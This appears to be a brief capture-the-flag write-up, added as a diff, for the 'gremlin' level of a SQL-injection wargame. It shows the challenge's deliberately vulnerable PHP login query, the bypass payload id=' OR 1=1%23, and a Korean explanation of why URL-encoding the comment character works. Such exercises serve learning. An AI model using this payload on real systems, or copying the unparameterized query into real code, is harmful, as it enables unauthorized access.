@@ -1,0 +1,21 @@
+query : select id from prob_gremlin where id='' OR 1=1#' and pw=''
+
+GREMLIN Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) solve("gremlin");
+  highlight_file(__FILE__);
+?>
+
+----------------------------------------------------------------------------------------------------------
+
+9,10) preg_match('/prob|_|\.|\(\)/i' 때문에 url에 #을 직접 삽입할 수 없음 그래서 %표시로 바꿔서 써줘야함. #=%23 띄어쓰기=%20 싱글쿼리=%27
+id와 pw가 만족하면 되므로 url 값에 ?id=' OR 1=1%23 으로 바꿔주면 뒤에 pw 값은 주석처리 되면서 값이 참이 되므로 해결!
